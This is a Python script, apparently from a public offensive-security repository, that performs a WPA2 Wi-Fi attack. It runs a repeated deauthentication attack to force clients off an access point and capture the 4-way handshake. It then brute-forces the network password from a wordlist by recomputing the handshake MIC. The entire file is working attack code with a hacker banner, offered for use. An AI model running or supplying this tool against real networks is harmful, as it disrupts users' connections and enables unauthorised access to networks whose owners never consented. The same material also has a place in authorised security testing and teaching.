#!/usr/bin/env python3

import argparse
import sys
import os
import re

from scapy.all import rdpcap, EAPOL_KEY, Dot11, raw, EAPOL
from utils import crypto, network
from utils.helpers import *

BANNER = r'''

██╗    ██╗██████╗  █████╗ ██████╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██╔══██╗██╔══██╗╚════██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝███████║ █████╔╝    ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██╔═══╝ ██╔══██║██╔═══╝     ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ██║  ██║███████╗    ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

 by @hacktheclown
 https://github.com/hacktheclown

'''

print(BANNER)

parser = argparse.ArgumentParser(description='WiFi WPA2 cracker',
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument('--wordlist',
                    help='Wordlist to use',
                    default='/usr/share/wordlists/rockyou.txt')
parser.add_argument('--debug',
                    help='Show additional messages',
                    action='store_true')
parser.add_argument('--interface',
                    help='Interface to use for the attack. Must be in monitor mode.',
                    required=True)
parser.add_argument('--scan-time',
                    help='Time to scan for SSIDs (in seconds)',
                    default=10)
parser.add_argument('--async-buffer-time',
                    help='Time to buffer results from AsyncSniffer() (in seconds)',
                    default=10)
parser.add_argument('--pcap-file',
                    help='File to write the packet capture for the 4-way handshake',
                    default='/tmp/deauth.pcap')
opts = parser.parse_args()

class Wifi_WPA2:
    def __init__(self) -> None:
        self.ssid = b''
        self.anonce = b''
        self.snonce = b''
        self.amac = b''
        self.smac = b''
        self.mic_msg2 = ''
        self.eapol_frame_msg2 = ''
        self.pcap_file = opts.pcap_file

    def decrypt(self) -> bool:
        print_info(f'Trying to brute force the keys using {opts.wordlist} ...')
        words = open(opts.wordlist, 'r').readlines()
        for word in words:
            psk = word.strip().encode('utf-8')
            pmk = crypto.get_pmk(psk=psk,
                                 ssid=self.ssid)
            ptk = crypto.get_ptk(pmk=pmk,
                                 anonce=self.anonce,
                                 snonce=self.snonce,
                                 amac=self.amac,
                                 smac=self.smac)
            kck = crypto.get_kck(ptk=ptk)
            mic_msg2_derived = crypto.get_mic(kck=kck,
                                              data=bytes.fromhex(self.eapol_frame_msg2)).hex()
            mic_msg2_extracted = self.mic_msg2

            print_debug(msg=f'Trying psk = {psk}', enabled=opts.debug)
            print_debug(msg=f'ssid = {self.ssid}', enabled=opts.debug)
            print_debug(msg=f'anonce = {self.anonce.hex()}', enabled=opts.debug)
            print_debug(msg=f'snonce = {self.snonce.hex()}', enabled=opts.debug)
            print_debug(msg=f'amac = {self.amac.hex()}', enabled=opts.debug)
            print_debug(msg=f'smac = {self.smac.hex()}', enabled=opts.debug)
            print_debug(msg=f'mic_msg2_derived = {mic_msg2_derived}', enabled=opts.debug)
            print_debug(msg=f'mic_msg2_extracted = {mic_msg2_extracted}', enabled=opts.debug)

            if mic_msg2_derived == mic_msg2_extracted:
                print_debug(msg='MIC_MSG2 matched!', enabled=opts.debug)
                print_ok(f'password is {psk.decode()}')
                return True
            else:
                print_debug(msg=f'{psk.decode()} did not match against MIC_MSG2',
                            enabled=opts.debug)

        return False

    def extract_handshake_info(self, ssid='') -> None:
        pkts = rdpcap(self.pcap_file)

        anonce = bytes.fromhex(pkts[0][EAPOL_KEY].key_nonce.hex())
        snonce = bytes.fromhex(pkts[1][EAPOL_KEY].key_nonce.hex())

        amac_raw = pkts[0][Dot11].addr3
        amac_str = amac_raw.replace(':', '')
        amac = bytes.fromhex(amac_str.replace(':', ''))
        amac_set = {amac_raw}

        mac_set = set()
        for i in range(0, 2):
            mac_set.add(pkts[i][Dot11].addr1)
            mac_set.add(pkts[i][Dot11].addr2)
            mac_set.add(pkts[i][Dot11].addr3)

        smac_str = list(mac_set.difference(amac_set))[0]
        smac = bytes.fromhex(smac_str.replace(':', ''))

        mic_msg2 = pkts[1][EAPOL_KEY].key_mic.hex()
        eapol_frame_msg2 = raw(pkts[1][EAPOL]).hex().replace(mic_msg2, '0'*32)

        self.ssid = ssid.encode()
        self.anonce = anonce
        self.snonce = snonce
        self.amac = amac
        self.smac = smac
        self.mic_msg2 = mic_msg2
        self.eapol_frame_msg2 = eapol_frame_msg2

    def start(self) -> None:
        ssid = network.get_ssid(interface=opts.interface,
                                scan_time=int(opts.scan_time))

        while not network.deauth(ssid=ssid,
                                 interface=opts.interface,
                                 async_buffer_time=int(opts.async_buffer_time),
                                 pcap_file=opts.pcap_file,
                                 debug=opts.debug):
            print_info("Performing deauthentication attack, looking for 4-way handshake ...")

        self.extract_handshake_info(ssid=ssid)

        CRACKED = self.decrypt()
        if CRACKED:
            sys.exit(0)
        else:
            print_err('Unable to crack the password')

if __name__ == '__main__':
    if os.getuid() != 0:
        print_err('Script must be ran as root')

    regex = re.compile('[!"\'#$%^&*()<>?/}{~:;]')
    if regex.search(opts.interface):
        print_err(msg="Possible command injection found")

    attack = Wifi_WPA2()
    attack.start()
